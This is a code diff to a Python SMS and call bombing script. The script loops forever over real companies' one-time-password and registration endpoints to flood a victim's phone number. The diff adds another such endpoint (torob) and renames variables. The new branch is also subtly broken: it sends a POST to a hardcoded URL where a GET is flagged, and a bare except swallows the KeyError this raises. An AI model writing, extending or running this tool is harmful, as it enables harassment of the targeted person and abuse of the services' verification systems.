@@ -198,6 +198,10 @@ smsApis = {
         'url': 'https://api-react.okala.com/C/CustomerAccount/OTPRegister',
         'request': {"mobile": num0, "confirmTerms": 'true', "notRobot": 'false'},
         'status': True
+    },
+    'torob':{
+        "url" : f'https://api.torob.com/v4/user/phone/send-pin/?phone_number={num0}',
+        "isGet" : True
     }
 }
 callApis = {
@@ -242,22 +246,24 @@ if 0<op < 3:
     selectedService = smsApis if op ==1 else callApis
     while True:
         random_head = random.choice(heads)
-        for webName,req in selectedService.items() :
+        for webName,payload in selectedService.items() :
             try:
-                webApi = req['url']
-                if req['request']:
-                    webReq = req['request']
+                webApi = payload['url']
+                if payload['isGet']:
+                    postReq = requests.post(f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={num0}")
+                elif payload['request']:
+                    webReq = payload['request']
                     postReq = requests.post(webApi, json=webReq,headers=random_head)
                 else:
                     postReq = requests.post(webApi)
                 print(webName,postReq.status_code)
-                if req['status'] == 'call':
+                if payload['status'] == 'call':
                     time.sleep(10)
-                if not checkResponse(postReq.status_code) and req['status'] == True :
-                    req['status'] = False  
+                if not checkResponse(postReq.status_code) and payload['status'] == True :
+                    payload['status'] = False  
                     print(webName,postReq.status_code,"needs to check")
             except:
-                req['status'] = False
+                payload['status'] = False
         time.sleep(10)
 else:
     print(f"{op} is a wrong value!!")
